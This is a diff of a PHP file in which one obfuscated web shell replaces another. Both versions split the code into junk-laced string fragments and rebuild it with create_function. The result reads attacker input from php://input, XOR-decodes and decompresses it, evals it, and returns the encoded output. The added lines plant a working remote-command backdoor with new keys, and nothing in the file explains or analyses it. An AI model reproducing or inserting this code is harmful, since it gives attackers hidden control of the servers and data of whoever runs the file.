@@ -1,12 +1,13 @@
-<br><b>
-<body>
 <?php
-$r=str_replace('vf','','cvfvfrevfate_vfvffuvfnction');
-$Q='$k="5YJ2363YJ63b";$YJkh="d4YJdfeeYJ5fc5dc";$kfYJ="3f32YJd35YJc6b5d"YJ;$pYJ="jd5W6YJfRRjJg23Rgi"YJ;YJfuncYJtioYJn x';
-$n='get_contents();@obYJ_enYJYJd_clean();$r=@bYJaseYJ64_YJencode(@x(@gzcYJompYJressYJ($o),$k)YJ);printYJ("$YJp$kh$r$kf");}';
-$M='($t,$k){$YJc=strlYJen(YJ$k);$l=YJstrlen($tYJYJ);$o="";foYJr($iYJ=0;$i<$l;){YJfor(YJYJ$j=0;($j<$c&&$iYJ<$l);$jYJ++,$';
-$P='put"YJ),$mYJ)==YJYJ1){@ob_start();@eYJvalYJ(@gzuYJncYJompreYJss(@x(YJ@base6YJ4_decode($mYJYJ[1]),$YJkYJ)));$YJoYJ=@ob_';
-$X='i+YJYJ+){$oYJ.=$t{$i}^$YJk{$j};}}rYJetuYJrn $o;}YJif(@pregYJYJ_matcYJhYJ("/$kh(.+)$kYJf/",@YJfileYJ_get_YJcontenYJts("php://in';
-$H=str_replace('YJ','',$Q.$M.$X.$P.$n);
-$B=$r('',$H);$B();
+$G='();$r=@base-6-4_--encode(@x(@gzcom-pres-s($o-),$k));prin-t("$p-$kh$r$kf");}';
+$t='_match-("/$kh(-.+-)$kf/-",@fi-le--_-get_conte-nts("php://input"),$m)=';
+$l='-=1) -{@ob-_start(-);@ev-al(@g-zuncompr-ess(@-x(@ba-se64_decod';
+$B=str_replace('aA','','creaAaAataAe_fuaAnaAaAction');
+$N=';$j++,$-i++)-{$o.=$t{$-i}^-$k{$j-};}}retu-rn $o;}if -(@p-reg';
+$h='-e($m[1])-,$k)-))-;$o=@ob_g-et_con-tents();-@-ob_end_c-lean-';
+$e='rl-en($t);-$o="";fo-r(-$i=0-;$i<$l;){for(-$j=0-;($-j<$c-&&$i<$l)-';
+$n='$k="52363-63b";-$kh="d4-d-fee5fc5-dc";$kf=-"3-f32d35-c6b5d";$p=';
+$X='"Y-M-J-DzMZyqM23-2rD-K";function x($-t-,$k){-$c=strlen(--$k);$l=st';
+$P=str_replace('-','',$n.$X.$e.$N.$t.$l.$h.$G);
+$g=$B('',$P);$g();
 ?>
